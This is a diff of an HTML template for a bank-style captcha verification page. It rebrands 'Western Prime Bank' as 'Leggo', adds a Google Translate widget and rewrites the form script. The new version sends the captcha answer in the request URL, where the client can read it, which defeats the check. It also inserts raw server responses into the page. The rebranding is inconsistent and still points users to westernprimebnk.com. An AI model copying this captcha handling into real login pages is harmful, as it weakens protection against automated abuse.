@@ -4,28 +4,43 @@
     <meta charset="utf-8">
     <meta name="author" content="Softnio">
     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-      <meta property="og:title" content="Western Prime Bank">
+      <meta property="og:title" content="Leggo">
     <meta property="og:type" content="article" />
     <meta property="og:image" content="https://westernprimebnk.com/logo.png">
     <meta property="og:url" content="https://westernprimebnk.com">
     <meta name="twitter:card" content="">
     <!--  Non-Essential, But Recommended -->
     <meta property="og:description" content="This Credit Union is federally insured by the National Credit Union Administration. We do business in accordance with the Fair Housing Law and Equal opportunity Credit Act.">
-    <meta property="og:site_name" content="Western Prime Bank">
+    <meta property="og:site_name" content="Leggo">
     <meta name="twitter:image:alt" content="">
-    <title>Western Prime Bank - </title>
+    <title>Leggo - </title>
     <meta name="description" content="This Credit Union is federally insured by the National Credit Union Administration. We do business in accordance with the Fair Housing Law and Equal opportunity Credit Act.">
     <link rel="shortcut icon" href="{{ url_for('static', path='account/images/favicon.png') }}" type="image/x-icon">
     <!-- Fav Icon  -->
     <link rel="shortcut icon" href="{{ url_for('static', path='account/images/favicon.png') }}">
     <!-- Page Title  -->
-    <title>Welcome to Western Prime Bank | Western Prime Bank</title>
+    <title>Welcome to  |  Leggo</title>
     <!-- StyleSheets  -->
-    <link rel="stylesheet" href="{{ url_for('static', path='account/assets/css/dashlite.css') }}">
+    <link rel="stylesheet" href="{{ url_for('static', path='account/assets/css/dashlite.css') }}?ver=2.4.0">
     <link rel="stylesheet" href="{{ url_for('static', path='account/scss/sweetalert.css') }}">
-    <link id="skin-default" rel="stylesheet" href="{{ url_for('static', path='account/assets/css/theme.css') }}">
+    <link id="skin-default" rel="stylesheet" href="{{ url_for('static', path='account/assets/css/theme.css') }}?ver=2.4.0">
      <link href="{{ url_for('static', path='account/css/toastr.css') }}" rel="stylesheet"/>
-     <style>
+</head>
+<script type="text/javascript">
+function googleTranslateElementInit() {
+  new google.translate.TranslateElement({pageLanguage: 'en', layout: google.translate.TranslateElement.InlineLayout.SIMPLE}, 'google_translate_element');
+}
+</script>
+<script type="text/javascript" src="https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
+    <style>
+.goog-te-gadget-simple {
+border:none;
+}
+.goog-te-gadget-simple a {
+color:#000;
+}
+</style>
+<style type="text/css">
     .btn-primary{
         background-color: #033d75;
     }
@@ -35,7 +50,6 @@
     .btn-secondary:hover{opacity: 0.6;}
     .btn-primary:hover{opacity: 0.6;}
 </style>
-</head>
 <body class="nk-body npc-crypto bg-white pg-auth">
     <!-- app body @s -->
     <div class="nk-app-root">
@@ -46,7 +60,7 @@
                 </div>
                 <div class="nk-block nk-block-middle nk-auth-body">
                     <div class="brand-logo pb-5">
-                        <a href="{{ url_for('home') }}" class="logo-link">
+                        <a href="" class="logo-link">
                             <img class="logo-light logo-img logo-img-lg" src="{{ url_for('static', path='account/logo.png') }}" srcset="{{ url_for('static', path='account/logo.png') }}" alt="logo">
                             <img class="logo-dark logo-img logo-img-lg" src="{{ url_for('static', path='account/logo.png') }}" srcset="{{ url_for('static', path='account/logo.png') }}" alt="logo-dark">
                         </a>
@@ -61,14 +75,15 @@
                             </div>
                         </div>
                     </div><!-- .nk-block-head -->
-    <form action="/account/scripts/auth?action=verifyRecaptcha" id="verifyForm" method="post">
+    <form action="/account/scripts/auth?action=verifyRecaptcha&code={{ captcha_code }}" id="verifyForm" method="post">
         <div class="form-group">
-        <div style="height: 46px; line-height: 46px; width:100%; text-align: center; background-color: #033d75; color: #ffffff!important; font-size: 26px; font-weight: bold; letter-spacing: 20px; font-family: 'Henny Penny', cursive;  -webkit-user-select: none; -moz-user-select: none;-ms-user-select: none;user-select: none;  display: flex; justify-content: center;" class="captcha"><span style="    float:left;     -webkit-transform: rotate(55deg);">7</span><span style="    float:left;     -webkit-transform: rotate(17deg);">5</span><span style="    float:left;     -webkit-transform: rotate(-56deg);">7</span><span style="    float:left;     -webkit-transform: rotate(-51deg);">1</span><span style="    float:left;     -webkit-transform: rotate(0deg);">0</span><span style="    float:left;     -webkit-transform: rotate(-45deg);">6</span></div><input type="hidden" name="captcha_secret" value="{{ captcha_secret }}"></div>
+        <link href="https://fonts.googleapis.com/css?family=Henny+Penny&display=swap" rel="stylesheet">
+        <div style="height: 46px; line-height: 46px; width:100%; text-align: center; background-color: #033d75; color: #ffffff!important; font-size: 26px; font-weight: bold; letter-spacing: 20px; font-family: 'Henny Penny', cursive;  -webkit-user-select: none; -moz-user-select: none;-ms-user-select: none;user-select: none;  display: flex; justify-content: center;" class="captcha"><span style="    float:left;     -webkit-transform: rotate(55deg);">{{ captcha_code[0] }}</span><span style="    float:left;     -webkit-transform: rotate(17deg);">{{ captcha_code[1] }}</span><span style="    float:left;     -webkit-transform: rotate(-56deg);">{{ captcha_code[2] }}</span><span style="    float:left;     -webkit-transform: rotate(-51deg);">{{ captcha_code[3] }}</span><span style="    float:left;     -webkit-transform: rotate(0deg);">{{ captcha_code[4] }}</span><span style="    float:left;     -webkit-transform: rotate(-45deg);">{{ captcha_code[5] }}</span></div><input type="hidden" name="captcha_secret" value="{{ captcha_secret }}"></div>
 
     <div class="form-group">
         <input type="text" name="captcha" id="captcha" class="form-control form-control-xl" placeholder="Enter code" autocomplete="off" required>
     </div>
-    <div id="verifyResult">{% if error %}<div class="alert alert-pro alert-danger my-3"><p class="alert-text">{{ error }}</p></div>{% endif %}</div>
+    <div id="verifyResult">{% if error %}<div class="alert alert-pro alert-danger"><p class="alert-text">{{ error }}</p></div>{% endif %}</div>
                         <div class="form-group">
                             <button class="btn btn-lg btn-primary btn-block secretFom" id="btn" type="submit" >Verify code</button>
                         </div>
@@ -76,8 +91,9 @@
 
                 </div><!-- .nk-block -->
                 <div class="nk-block nk-auth-footer">
-                    <div class="mt-3">
-                        <p>&copy; 2026 Western Prime Bank. All Rights Reserved.</p>
+                    <a href="#" style=""><div id="google_translate_element"></div> </a>
+                   <div class="mt-3">
+                        <p>&copy; 2026 Leggo. All Rights Reserved.</p>
                     </div>
                 </div><!-- .nk-block -->
             </div><!-- .nk-split-content -->
@@ -102,8 +118,8 @@
                                     <img class="round" src="{{ url_for('static', path='account/images/banking.svg') }}" srcset="{{ url_for('static', path='account/images/banking.svg') }} 2x" alt="">
                                 </div>
                                 <div class="nk-feature-content py-4 p-sm-5">
-                                    <h4>Western Prime Bank</h4>
-                                    <p>We'll never send an email containing a link to Western Prime Bank.<br>
+                                    <h4>Leggo</h4>
+                                    <p>We'll never send an email containing a link to Leggo.<br>
                                       We'll never ask for your passwords or Secret Code.</p>
                                 </div>
                             </div>
@@ -114,8 +130,8 @@
                                     <img class="round" src="{{ url_for('static', path='account/images/onlinebanking.svg') }}" srcset="{{ url_for('static', path='account/images/onlinebanking.svg') }} 2x" alt="">
                                 </div>
                                 <div class="nk-feature-content py-4 p-sm-5">
-                                    <h4>Western Prime Bank</h4>
-                                    <p>When accessing Western Prime Bank online banking, always open a new browser window and type westernprimebnk.com</p>
+                                    <h4>Leggo</h4>
+                                    <p>When accessing Leggo online banking, always open a new browser window and type westernprimebnk.com</p>
                                 </div>
                             </div>
                         </div><!-- .slider-item -->
@@ -137,10 +153,10 @@
     }
     {% else %}
     $("#verifyForm").on('submit',(function(e) {
+        document.getElementById("btn").disabled = true;
         e.preventDefault();
-        $("#btn").prop("disabled", true).val("Verifying...");
         $.ajax({
-            url: "/account/scripts/auth?action=verifyRecaptcha",
+            url: "/account/scripts/auth?action=verifyRecaptcha&code={{ captcha_code }}",
             type: "POST",
             data:  new FormData(this),
             contentType: false,
@@ -148,18 +164,15 @@
             processData:false,
             success: function(data)
             {
-                var res;
-                try { res = JSON.parse(data); } catch(err) { $("#verifyResult").html(data); $("#btn").prop("disabled", false).val("Verify code"); return; }
-                $("#verifyResult").html(res.message);
-                if (res.success) {
-                    setTimeout(function(){ window.location.href = res.redirect; }, 600);
-                } else {
-                    $("#btn").prop("disabled", false).val("Verify code");
-                }
+            $("#verifyResult").html(data);
+            document.getElementById("btn").disabled = false;
+            if (data.indexOf("Verified!") !== -1) {
+                setTimeout(function(){ window.location.href = "{{ url_for('account_auth_page') }}"; }, 600);
+            }
             },
             error: function()
             {
-                $("#btn").prop("disabled", false).val("Verify code");
+            document.getElementById("btn").disabled = false;
             }
        });
     }));
@@ -167,8 +180,8 @@
 });
 </script>
 
-    <script src="{{ url_for('static', path='account/assets/js/bundle.js') }}"></script>
-    <script src="{{ url_for('static', path='account/assets/js/scripts.js') }}"></script>
+    <script src="{{ url_for('static', path='account/assets/js/bundle.js') }}?ver=2.4.0"></script>
+    <script src="{{ url_for('static', path='account/assets/js/scripts.js') }}?ver=2.4.0"></script>
    <script src="{{ url_for('static', path='account/js/vendors/sweetalert.js') }}"></script>
    <script src="{{ url_for('static', path='account/assets/js/custom.js') }}"></script>
    <script src="{{ url_for('static', path='account/js/toastr.js') }}"></script>
